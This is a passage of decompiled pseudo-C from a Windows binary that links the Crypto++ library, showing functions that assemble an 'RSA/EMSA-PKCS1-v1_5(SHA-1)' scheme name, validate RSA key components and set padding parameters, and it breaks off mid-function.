// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00451280) --------------------------------------------------------
char __thiscall sub_451280(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax

  v1 = this + 2;
  v2 = (*(int (__thiscall **)(_DWORD *))(this[2] + 8))(this + 2);
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 8))(v2) )
    (*(void (__thiscall **)(_DWORD *))(*v1 + 12))(v1);
  return 1;
}

//----- (004512B0) --------------------------------------------------------
char __thiscall sub_4512B0(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax

  v1 = this + 2;
  v2 = (*(int (__thiscall **)(_DWORD *))(this[2] + 8))(this + 2);
  if ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 24))(v2) )
    (*(void (__thiscall **)(_DWORD *))(*v1 + 12))(v1);
  return 1;
}

//----- (004512E0) --------------------------------------------------------
_DWORD *__cdecl sub_4512E0(_DWORD *a1, _DWORD *a2, int a3)
{
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // esi
  unsigned int v6; // edx
  void *v7; // esi
  int v9; // [esp+10h] [ebp-40h] BYREF
  unsigned int v10; // [esp+18h] [ebp-38h]
  unsigned int v11; // [esp+1Ch] [ebp-34h]
  void *v12; // [esp+20h] [ebp-30h]
  _DWORD v13[2]; // [esp+28h] [ebp-28h] BYREF
  unsigned int v14; // [esp+30h] [ebp-20h]
  unsigned int v15; // [esp+34h] [ebp-1Ch]
  void *Block; // [esp+38h] [ebp-18h]
  int v17; // [esp+40h] [ebp-10h]
  int v18; // [esp+4Ch] [ebp-4h]

  v17 = 0;
  v3 = sub_441D00(&v9, (int)a2);
  v18 = 1;
  sub_441920(a2, v13, v3);
  v17 = 2;
  LOBYTE(v18) = 2;
  sub_44E440(v13, a1, a3);
  v17 = 7;
  v4 = v15;
  v5 = Block;
  if ( v14 < v15 )
    v4 = v14;
  LOBYTE(v18) = 3;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v6 = v11;
  v7 = v12;
  if ( v10 < v11 )
    v6 = v10;
  v18 = 4;
  memset(v12, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  return a1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4512E0: using guessed type _DWORD var_28[2];

//----- (004513D0) --------------------------------------------------------
int __thiscall sub_4513D0(void *this, int a2)
{
  if ( a2 == (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this) )
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  else
    return 0;
}

//----- (004513F0) --------------------------------------------------------
int __thiscall sub_4513F0(_DWORD *this)
{
  int *v1; // esi
  int *v2; // eax
  int v3; // edx
  int v4; // eax
  _DWORD *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // edx
  void *v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // eax
  int v13; // eax
  char v15[8]; // [esp+10h] [ebp-34h] BYREF
  unsigned int v16; // [esp+18h] [ebp-2Ch]
  unsigned int v17; // [esp+1Ch] [ebp-28h]
  void *Block; // [esp+20h] [ebp-24h]
  char v19[8]; // [esp+28h] [ebp-1Ch] BYREF
  _DWORD *v20; // [esp+30h] [ebp-14h]
  int *v21; // [esp+34h] [ebp-10h]
  int v22; // [esp+40h] [ebp-4h]

  v20 = this;
  v1 = this + 2;
  v2 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v3 = *v1;
  v21 = v2;
  v4 = (*(int (__thiscall **)(int *))(v3 + 4))(v1);
  v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v4 + 8))(v4, v15);
  v22 = 0;
  v6 = sub_440BD0(v5);
  if ( v6 <= 1 )
    v7 = 0;
  else
    v7 = v6 - 1;
  v8 = v17;
  v9 = Block;
  if ( v16 < v17 )
    v8 = v16;
  v22 = 1;
  memset(Block, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = (int)v20;
  v22 = -1;
  v11 = *v21;
  v12 = (*(int (__thiscall **)(_DWORD *))(*v20 + 64))(v20);
  v13 = (*(int (__thiscall **)(int, char *, int))(*(_DWORD *)v10 + 60))(v10, v19, v12);
  return (*(int (__thiscall **)(int *, unsigned int, _DWORD))(v11 + 8))(v21, v7, *(_DWORD *)(v13 + 4));
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4513F0: using guessed type char var_34[8];
// 4513F0: using guessed type char var_1C[8];

//----- (004514D0) --------------------------------------------------------
int __thiscall sub_4514D0(_DWORD *this)
{
  int *v1; // esi
  int *v2; // eax
  int v3; // edx
  int v4; // eax
  _DWORD *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // edx
  void *v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // eax
  int v13; // eax
  char v15[8]; // [esp+10h] [ebp-34h] BYREF
  unsigned int v16; // [esp+18h] [ebp-2Ch]
  unsigned int v17; // [esp+1Ch] [ebp-28h]
  void *Block; // [esp+20h] [ebp-24h]
  char v19[8]; // [esp+28h] [ebp-1Ch] BYREF
  _DWORD *v20; // [esp+30h] [ebp-14h]
  int *v21; // [esp+34h] [ebp-10h]
  int v22; // [esp+40h] [ebp-4h]

  v20 = this;
  v1 = this + 2;
  v2 = (int *)(*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  v3 = *v1;
  v21 = v2;
  v4 = (*(int (__thiscall **)(int *))(v3 + 4))(v1);
  v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v4 + 8))(v4, v15);
  v22 = 0;
  v6 = sub_440BD0(v5);
  if ( v6 <= 1 )
    v7 = 0;
  else
    v7 = v6 - 1;
  v8 = v17;
  v9 = Block;
  if ( v16 < v17 )
    v8 = v16;
  v22 = 1;
  memset(Block, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v10 = (int)v20;
  v22 = -1;
  v11 = *v21;
  v12 = (*(int (__thiscall **)(_DWORD *))(*v20 + 72))(v20);
  v13 = (*(int (__thiscall **)(int, char *, int))(*(_DWORD *)v10 + 68))(v10, v19, v12);
  return (*(int (__thiscall **)(int *, unsigned int, _DWORD))(v11 + 8))(v21, v7, *(_DWORD *)(v13 + 4));
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4514D0: using guessed type char var_34[8];
// 4514D0: using guessed type char var_1C[8];

//----- (004515B0) --------------------------------------------------------
int __thiscall sub_4515B0(void *this, int a2)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this);
}

//----- (004515C0) --------------------------------------------------------
int __stdcall sub_4515C0(int a1, int a2)
{
  return 8 * (a2 + a1) + 80;
}

//----- (004515E0) --------------------------------------------------------
int __thiscall sub_4515E0(int this, int a2)
{
  int v3; // ebx
  void (__thiscall ***v4)(_DWORD, int); // ecx
  int result; // eax

  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersBase::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_BYTE *)(a2 + 9) = *(_BYTE *)(this + 9);
  *(_DWORD *)(a2 + 12) = 0;
  v3 = *(_DWORD *)(this + 12);
  *(_DWORD *)(this + 12) = 0;
  v4 = *(void (__thiscall ****)(_DWORD, int))(a2 + 12);
  if ( v4 )
    (**v4)(v4, 1);
  *(_DWORD *)(a2 + 12) = v3;
  *(_BYTE *)(this + 9) = 1;
  *(_DWORD *)a2 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
  result = *(_DWORD *)(this + 16);
  *(_DWORD *)(a2 + 16) = result;
  return result;
}
// 4B9390: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';
// 4BB4A4: using guessed type void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';

//----- (004516F0) --------------------------------------------------------
_DWORD *sub_4516F0()
{
  _DWORD *v0; // eax

  v0 = operator new(0x138u);
  if ( v0 )
    return sub_44F2C0(v0);
  else
    return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00451760) --------------------------------------------------------
int __thiscall sub_451760(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 4))(v1);
}

//----- (00451780) --------------------------------------------------------
int __thiscall sub_451780(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (00451840) --------------------------------------------------------
_DWORD *__thiscall sub_451840(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 47, a2);
}

//----- (00451850) --------------------------------------------------------
_DWORD *__thiscall sub_451850(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 53, a2);
}

//----- (00451860) --------------------------------------------------------
_DWORD *__thiscall sub_451860(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 3, a2);
}

//----- (00451870) --------------------------------------------------------
_DWORD *__thiscall sub_451870(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 59, a2);
}

//----- (00451880) --------------------------------------------------------
_DWORD *__thiscall sub_451880(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 35, a2);
}

//----- (00451890) --------------------------------------------------------
_DWORD *__thiscall sub_451890(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 41, a2);
}

//----- (004518A0) --------------------------------------------------------
_DWORD *__thiscall sub_4518A0(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 29, a2);
}

//----- (004518B0) --------------------------------------------------------
_DWORD *__thiscall sub_4518B0(_DWORD *this, _DWORD *a2)
{
  return sub_43DBB0(this + 9, a2);
}

//----- (004518C0) --------------------------------------------------------
int __thiscall sub_4518C0(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v8; // [esp+18h] [ebp-1Ch]
  unsigned int v9; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v11; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 12))(v1, v7);
  v11 = 0;
  v3 = sub_440C10(v2);
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  v11 = 1;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4518C0: using guessed type char var_24[8];

//----- (00451950) --------------------------------------------------------
int __cdecl sub_451950(int a1)
{
  char *v1; // eax
  void **v2; // eax
  void **v3; // eax
  void **v4; // eax
  void **v5; // eax
  void **v6; // eax
  void *v7; // ecx
  void *v8; // ecx
  void *v9; // ecx
  void *v10; // ecx
  void *v11; // ecx
  void *v13; // [esp+Ch] [ebp-88h] BYREF
  unsigned int v14; // [esp+20h] [ebp-74h]
  __int128 v15; // [esp+24h] [ebp-70h] BYREF
  __int64 v16; // [esp+34h] [ebp-60h]
  __int128 v17; // [esp+3Ch] [ebp-58h] BYREF
  __int64 v18; // [esp+4Ch] [ebp-48h]
  __int128 v19; // [esp+54h] [ebp-40h] BYREF
  __int64 v20; // [esp+64h] [ebp-30h]
  __int128 v21; // [esp+6Ch] [ebp-28h] BYREF
  __int64 v22; // [esp+7Ch] [ebp-18h]
  int v23; // [esp+90h] [ebp-4h]

  v1 = (char *)sub_419B80((int)&v13, "RSA");
  v23 = 0;
  v2 = sub_41F120(v1, "/", 1u);
  v16 = 0i64;
  v15 = *(_OWORD *)v2;
  v16 = *((_QWORD *)v2 + 2);
  v2[4] = 0;
  v2[5] = (void *)15;
  *(_BYTE *)v2 = 0;
  LOBYTE(v23) = 1;
  v3 = sub_41F120((char *)&v15, "EMSA-PKCS1-v1_5", 0xFu);
  v18 = 0i64;
  v17 = *(_OWORD *)v3;
  v18 = *((_QWORD *)v3 + 2);
  v3[4] = 0;
  v3[5] = (void *)15;
  *(_BYTE *)v3 = 0;
  LOBYTE(v23) = 2;
  v4 = sub_41F120((char *)&v17, "(", 1u);
  v20 = 0i64;
  v19 = *(_OWORD *)v4;
  v20 = *((_QWORD *)v4 + 2);
  v4[4] = 0;
  v4[5] = (void *)15;
  *(_BYTE *)v4 = 0;
  LOBYTE(v23) = 3;
  v5 = sub_41F120((char *)&v19, "SHA-1", 5u);
  v22 = 0i64;
  v21 = *(_OWORD *)v5;
  v22 = *((_QWORD *)v5 + 2);
  v5[4] = 0;
  v5[5] = (void *)15;
  *(_BYTE *)v5 = 0;
  LOBYTE(v23) = 4;
  v6 = sub_41F120((char *)&v21, ")", 1u);
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_OWORD *)a1 = *(_OWORD *)v6;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v6 + 2);
  v6[4] = 0;
  v6[5] = (void *)15;
  *(_BYTE *)v6 = 0;
  if ( HIDWORD(v22) >= 0x10 )
  {
    v7 = (void *)v21;
    if ( (unsigned int)(HIDWORD(v22) + 1) >= 0x1000 )
    {
      v7 = *(void **)(v21 - 4);
      if ( (unsigned int)(v21 - (_DWORD)v7 - 4) > 0x1F )
        goto LABEL_22;
    }
    sub_46C87D(v7);
  }
  v22 = 0xF00000000i64;
  LOBYTE(v21) = 0;
  if ( HIDWORD(v20) >= 0x10 )
  {
    v8 = (void *)v19;
    if ( (unsigned int)(HIDWORD(v20) + 1) >= 0x1000 )
    {
      v8 = *(void **)(v19 - 4);
      if ( (unsigned int)(v19 - (_DWORD)v8 - 4) > 0x1F )
        goto LABEL_22;
    }
    sub_46C87D(v8);
  }
  v20 = 0xF00000000i64;
  LOBYTE(v19) = 0;
  if ( HIDWORD(v18) >= 0x10 )
  {
    v9 = (void *)v17;
    if ( (unsigned int)(HIDWORD(v18) + 1) >= 0x1000 )
    {
      v9 = *(void **)(v17 - 4);
      if ( (unsigned int)(v17 - (_DWORD)v9 - 4) > 0x1F )
        goto LABEL_22;
    }
    sub_46C87D(v9);
  }
  v18 = 0xF00000000i64;
  LOBYTE(v17) = 0;
  if ( HIDWORD(v16) >= 0x10 )
  {
    v10 = (void *)v15;
    if ( (unsigned int)(HIDWORD(v16) + 1) >= 0x1000 )
    {
      v10 = *(void **)(v15 - 4);
      if ( (unsigned int)(v15 - (_DWORD)v10 - 4) > 0x1F )
        goto LABEL_22;
    }
    sub_46C87D(v10);
  }
  v16 = 0xF00000000i64;
  LOBYTE(v15) = 0;
  if ( v14 >= 0x10 )
  {
    v11 = v13;
    if ( v14 + 1 < 0x1000
      || (v11 = (void *)*((_DWORD *)v13 - 1), (unsigned int)((_BYTE *)v13 - (_BYTE *)v11 - 4) <= 0x1F) )
    {
      sub_46C87D(v11);
      return a1;
    }
LABEL_22:
    _invalid_parameter_noinfo_noreturn();
  }
  return a1;
}

//----- (00451C50) --------------------------------------------------------
char __thiscall sub_451C50(_DWORD *this, int *a2, unsigned int a3)
{
  int v3; // edi
  int v4; // ebx
  int *v5; // eax
  int *v6; // eax
  int *v7; // eax
  _DWORD *v8; // esi
  int *v9; // eax
  int *v10; // eax
  int *v11; // eax
  int *v12; // eax
  char v13; // al
  int v14; // eax
  int v15; // ebx
  int v16; // edi
  int v17; // ebx
  _DWORD *v18; // esi
  int v19; // eax
  int v20; // ebx
  int v21; // esi
  int v22; // ebx
  int v23; // eax
  _DWORD v25[6]; // [esp+10h] [ebp-B4h] BYREF
  _DWORD v26[6]; // [esp+28h] [ebp-9Ch] BYREF
  _DWORD v27[6]; // [esp+40h] [ebp-84h] BYREF
  _DWORD v28[6]; // [esp+58h] [ebp-6Ch] BYREF
  _DWORD v29[6]; // [esp+70h] [ebp-54h] BYREF
  _DWORD v30[6]; // [esp+88h] [ebp-3Ch] BYREF
  _DWORD v31[6]; // [esp+A0h] [ebp-24h] BYREF
  int v32; // [esp+C0h] [ebp-4h]
  _DWORD v33[6]; // [esp+C4h] [ebp+0h] BYREF
  _DWORD v34[6]; // [esp+DCh] [ebp+18h] BYREF
  _DWORD v35[6]; // [esp+F4h] [ebp+30h] BYREF
  _DWORD v36[6]; // [esp+10Ch] [ebp+48h] BYREF
  _DWORD *v37; // [esp+124h] [ebp+60h]
  _DWORD *v38; // [esp+128h] [ebp+64h]
  int v39; // [esp+12Ch] [ebp+68h]
  char v40; // [esp+133h] [ebp+6Fh]

  v3 = (int)this;
  v38 = this;
  v4 = 0;
  v39 = 0;
  v5 = sub_443600();
  if ( sub_440F30((_DWORD *)(v3 - 248), (int)v5) <= 0 )
    goto LABEL_25;
  if ( sub_4428B0((_DWORD *)(v3 - 248), 0) != 1 )
    goto LABEL_25;
  v6 = sub_443600();
  if ( sub_440F30((_DWORD *)(v3 - 224), (int)v6) <= 0 )
    goto LABEL_25;
  if ( sub_4428B0((_DWORD *)(v3 - 224), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 224), v3 - 248) < 0
    && (v7 = sub_443600(),
        v8 = (_DWORD *)(v3 - 120),
        v37 = (_DWORD *)(v3 - 120),
        sub_440F30((_DWORD *)(v3 - 120), (int)v7) > 0)
    && sub_4428B0((_DWORD *)(v3 - 120), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 120), v3 - 248) < 0
    && (v9 = sub_443600(), sub_440F30((_DWORD *)(v3 - 96), (int)v9) > 0)
    && sub_4428B0((_DWORD *)(v3 - 96), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 96), v3 - 248) < 0
    && (v10 = sub_443600(), sub_440F30((_DWORD *)(v3 - 144), (int)v10) > 0)
    && sub_4428B0((_DWORD *)(v3 - 144), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 144), v3 - 248) < 0
    && (v11 = sub_443600(), sub_440F30((_DWORD *)(v3 - 72), (int)v11) > 0)
    && sub_4428B0((_DWORD *)(v3 - 72), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 72), v3 - 120) < 0
    && (v12 = sub_443600(), sub_440F30((_DWORD *)(v3 - 48), (int)v12) > 0)
    && sub_4428B0((_DWORD *)(v3 - 48), 0) == 1
    && sub_440F30((_DWORD *)(v3 - 48), v3 - 96) < 0
    && *(_DWORD *)(v3 - 4) != 1
    && !sub_43DCE0((_DWORD *)(v3 - 24))
    && sub_440F30((_DWORD *)(v3 - 24), v3 - 120) < 0 )
  {
    v13 = 1;
  }
  else
  {
LABEL_25:
    v8 = (_DWORD *)(v3 - 120);
    v13 = 0;
    v37 = (_DWORD *)(v3 - 120);
  }
  v40 = v13;
  if ( !a3 )
    goto LABEL_78;
  if ( !v13
    || (sub_44E440(v8, v36, v3 - 96), v32 = 0, v4 = 262145, v39 = 262145, v14 = sub_440F30(v36, v3 - 248), v40 = 1, v14) )
  {
    v40 = 0;
  }
  v32 = -1;
  if ( (v4 & 1) != 0 )
  {
    v4 &= ~1u;
    sub_4066A0((int)v36);
  }
  if ( !v40 )
    goto LABEL_34;
  sub_43D500(v29, 1u);
  v15 = v4 | 2;
  v32 = 1;
  v39 = v15;
  v16 = v15;
  sub_43D500(v30, 1u);
  v32 = 2;
  v39 = v15 | 4;
  sub_43D500(v31, 1u);
  v17 = (int)v38;
  v32 = 3;
  v39 = v16 | 0xC;
  sub_4431A0(v38 - 24, v33, (int)v30);
  v32 = 4;
  v39 = v16 | 0x8001C;
  sub_4431A0(v8, v34, (int)v31);
  v32 = 5;
  v39 = v16 | 0x18003C;
  v18 = sub_4512E0(v25, v34, (int)v33);
  v32 = 6;
  v39 = v16 | 0x18007C;
  sub_44E440((_DWORD *)(v17 - 224), v35, v17 - 144);
  v32 = 7;
  v39 = v16 | 0x3800FC;
  sub_4432F0(v35, v36, v18);
  v32 = 8;
  v4 = v16 | 0x7801FC;
  v39 = v16 | 0x7801FC;
  v19 = sub_440F30(v36, (int)v29);
  v40 = 1;
  if ( v19 )
LABEL_34:
    v40 = 0;
  if ( (v4 & 0x100) != 0 )
  {
    v4 &= ~0x100u;
    sub_4066A0((int)v36);
  }
  if ( (v4 & 0x80u) != 0 )
  {
    v4 &= ~0x80u;
    sub_4066A0((int)v35);
  }
  if ( (v4 & 0x40) != 0 )
  {
    v4 &= ~0x40u;
    sub_4066A0((int)v25);
  }
  if ( (v4 & 0x20) != 0 )
  {
    v4 &= ~0x20u;
    sub_4066A0((int)v34);
  }
  if ( (v4 & 0x10) != 0 )
  {
    v4 &= ~0x10u;
    sub_4066A0((int)v33);
  }
  if ( (v4 & 8) != 0 )
  {
    v4 &= ~8u;
    sub_4066A0((int)v31);
  }
  if ( (v4 & 4) != 0 )
  {
    v4 &= ~4u;
    sub_4066A0((int)v30);
  }
  v32 = -1;
  if ( (v4 & 2) != 0 )
  {
    v4 &= ~2u;
    sub_4066A0((int)v29);
  }
  if ( !v40 )
  {
    v3 = (int)v38;
LABEL_56:
    v40 = 0;
    goto LABEL_57;
  }
  sub_43D500(v35, 1u);
  v32 = 9;
  v20 = v4 | 0x200;
  v39 = v20;
  v21 = v20;
  sub_4431A0(v37, v34, (int)v35);
  v3 = (int)v38;
  v32 = 10;
  v39 = v20 | 0x800400;
  sub_4432F0(v38 - 36, v33, v34);
  v32 = 11;
  v4 = v20 | 0x1800C00;
  v39 = v4;
  if ( sub_440F30((_DWORD *)(v3 - 72), (int)v33) )
    goto LABEL_56;
  sub_43D500(v31, 1u);
  v32 = 12;
  v39 = v21 | 0x1801C00;
  sub_4431A0((_DWORD *)(v3 - 96), v30, (int)v31);
  v32 = 13;
  v39 = v21 | 0x3803C00;
  sub_4432F0((_DWORD *)(v3 - 144), v29, v30);
  v32 = 14;
  v4 = v21 | 0x7807C00;
  v39 = v21 | 0x7807C00;
  if ( sub_440F30((_DWORD *)(v3 - 48), (int)v29) )
    goto LABEL_56;
  v40 = 1;
LABEL_57:
  if ( (v4 & 0x4000) != 0 )
  {
    v4 &= ~0x4000u;
    sub_4066A0((int)v29);
  }
  if ( (v4 & 0x2000) != 0 )
  {
    v4 &= ~0x2000u;
    sub_4066A0((int)v30);
  }
  if ( (v4 & 0x1000) != 0 )
  {
    v4 &= ~0x1000u;
    sub_4066A0((int)v31);
  }
  if ( (v4 & 0x800) != 0 )
  {
    v4 &= ~0x800u;
    sub_4066A0((int)v33);
  }
  if ( (v4 & 0x400) != 0 )
  {
    v4 &= ~0x400u;
    sub_4066A0((int)v34);
  }
  v32 = -1;
  if ( (v4 & 0x200) != 0 )
  {
    v4 &= ~0x200u;
    sub_4066A0((int)v35);
  }
  if ( !v40 )
    goto LABEL_71;
  sub_43D500(v26, 1u);
  v32 = 15;
  v22 = v4 | 0x8000;
  v39 = v22;
  sub_44E440((_DWORD *)(v3 - 24), v27, v3 - 96);
  v32 = 16;
  v39 = v22 | 0x8010000;
  sub_4432F0(v27, v28, (_DWORD *)(v3 - 120));
  v32 = 17;
  v4 = v22 | 0x18030000;
  v39 = v4;
  v23 = sub_440F30(v28, (int)v26);
  v40 = 1;
  if ( v23 )
LABEL_71:
    v40 = 0;
  if ( (v4 & 0x20000) != 0 )
  {
    v4 &= ~0x20000u;
    sub_4066A0((int)v28);
  }
  if ( (v4 & 0x10000) != 0 )
    sub_4066A0((int)v27);
  v32 = -1;
  if ( (v4 & 0x8000) != 0 )
    sub_4066A0((int)v26);
LABEL_78:
  if ( a3 < 2 )
    return v40;
  return v40 && sub_466110(a2, (_DWORD *)(v3 - 120), a3 - 2) && sub_466110(a2, (_DWORD *)(v3 - 96), a3 - 2);
}
// 451C50: using guessed type _DWORD var_28[6];
// 451C50: using guessed type _DWORD var_C4[6];
// 451C50: using guessed type _DWORD var_AC[6];
// 451C50: using guessed type _DWORD var_94[6];
// 451C50: using guessed type _DWORD var_70[6];
// 451C50: using guessed type _DWORD var_58[6];
// 451C50: using guessed type _DWORD var_124[6];
// 451C50: using guessed type _DWORD var_40[6];
// 451C50: using guessed type _DWORD var_10C[6];
// 451C50: using guessed type _DWORD var_F4[6];
// 451C50: using guessed type _DWORD var_DC[6];

//----- (00452310) --------------------------------------------------------
bool __thiscall sub_452310(_DWORD *this, int a2, int a3)
{
  int *v4; // eax
  int v5; // edi
  int *v6; // eax
  _DWORD *v7; // esi
  bool result; // al

  v4 = sub_443600();
  v5 = (int)(this - 12);
  result = 0;
  if ( sub_440F30(this - 12, (int)v4) > 0 && sub_4428B0(this - 12, 0) == 1 )
  {
    v6 = sub_443600();
    v7 = this - 6;
    if ( sub_440F30(v7, (int)v6) > 0 && sub_4428B0(v7, 0) == 1 && sub_440F30(v7, v5) < 0 )
      return 1;
  }
  return result;
}

//----- (00452370) --------------------------------------------------------
bool __cdecl sub_452370(_DWORD *a1, _DWORD *a2)
{
  _DWORD *v2; // ecx
  _DWORD *v3; // edx
  unsigned int v4; // esi
  unsigned int v5; // esi
  bool v6; // cf
  unsigned __int8 v7; // al
  unsigned __int8 v8; // al
  unsigned __int8 v9; // al
  int v10; // eax

  v2 = a2;
  if ( a2[5] >= 0x10u )
    v2 = (_DWORD *)*a2;
  v3 = a1;
  if ( a1[5] >= 0x10u )
    v3 = (_DWORD *)*a1;
  v4 = a1[4];
  if ( v4 != a2[4] )
    return 0;
  v6 = v4 < 4;
  v5 = v4 - 4;
  if ( v6 )
  {
LABEL_9:
    if ( v5 == -4 )
      goto LABEL_18;
  }
  else
  {
    while ( *v3 == *v2 )
    {
      ++v3;
      ++v2;
      v6 = v5 < 4;
      v5 -= 4;
      if ( v6 )
        goto LABEL_9;
    }
  }
  v6 = *(_BYTE *)v3 < *(_BYTE *)v2;
  if ( *(_BYTE *)v3 != *(_BYTE *)v2
    || v5 != -3
    && ((v7 = *((_BYTE *)v3 + 1), v6 = v7 < *((_BYTE *)v2 + 1), v7 != *((_BYTE *)v2 + 1))
     || v5 != -2
     && ((v8 = *((_BYTE *)v3 + 2), v6 = v8 < *((_BYTE *)v2 + 2), v8 != *((_BYTE *)v2 + 2))
      || v5 != -1 && (v9 = *((_BYTE *)v3 + 3), v6 = v9 < *((_BYTE *)v2 + 3), v9 != *((_BYTE *)v2 + 3)))) )
  {
    v10 = v6 ? -1 : 1;
    return !v10;
  }
LABEL_18:
  v10 = 0;
  return !v10;
}

//----- (00452400) --------------------------------------------------------
_DWORD *__cdecl sub_452400(_DWORD *a1, int a2, _DWORD *a3, char a4)
{
  _DWORD *v4; // edi
  _DWORD *v6; // esi
  int v7; // eax
  void (__thiscall ***v8)(_DWORD, int); // ecx
  void (__thiscall ***v9)(_DWORD, int); // ecx
  int v11; // [esp+10h] [ebp-1Ch] BYREF
  void (__thiscall ***v12)(_DWORD, int); // [esp+14h] [ebp-18h]
  _DWORD *v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+28h] [ebp-4h]
  int v15; // [esp+40h] [ebp+14h]

  v4 = sub_4550C0(&v11);
  v14 = 0;
  v6 = operator new(0x14u);
  v13 = v6;
  if ( v6 )
  {
    v6[1] = a2;
    *((_BYTE *)v6 + 8) = a4;
    *((_BYTE *)v6 + 9) = 0;
    v6[3] = 0;
    *v6 = &CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';
    v6[4] = *a3;
  }
  else
  {
    v6 = 0;
  }
  v13 = v6;
  v7 = v4[1];
  v4[1] = 0;
  v8 = (void (__thiscall ***)(_DWORD, int))v6[3];
  LOBYTE(v14) = 1;
  v15 = v7;
  if ( v8 )
  {
    (**v8)(v8, 1);
    v7 = v15;
  }
  v6[3] = v7;
  v9 = (void (__thiscall ***)(_DWORD, int))v4[1];
  v13 = 0;
  if ( v9 )
    (**v9)(v9, 1);
  v4[1] = v6;
  *((_BYTE *)v4 + 8) = a4;
  LOBYTE(v14) = 0;
  sub_455040(a1, (int)v4);
  v14 = 3;
  if ( v12 )
    (**v12)(v12, 1);
  return a1;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BBE08: using guessed type void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable';

//----- (004524F0) --------------------------------------------------------
int __cdecl sub_4524F0(_DWORD *a1, unsigned int *a2)
{
  unsigned int v2; // esi

  v2 = *a2;
  if ( !*a2 || ((v2 - 1) & v2) != 0 )
    return *a1 - *a1 % v2;
  else
    return *a1 - (*a1 & (v2 > 1 ? v2 - 1 : 0));
}

//----- (00452530) --------------------------------------------------------
_DWORD *__thiscall sub_452530(_DWORD *this, int a2, int a3, char a4, int a5, _DWORD *a6, int a7)
{
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  void (__thiscall ***v11)(_DWORD, int); // ecx
  _DWORD *result; // eax

  sub_452E80((int)this, a2 + 8, a3, a7, 1);
  *this = &off_4BB73C;
  this[1] = &off_4BB834;
  this[18] = &off_4BB844;
  v8 = operator new(0x14u);
  v9 = v8;
  if ( v8 )
  {
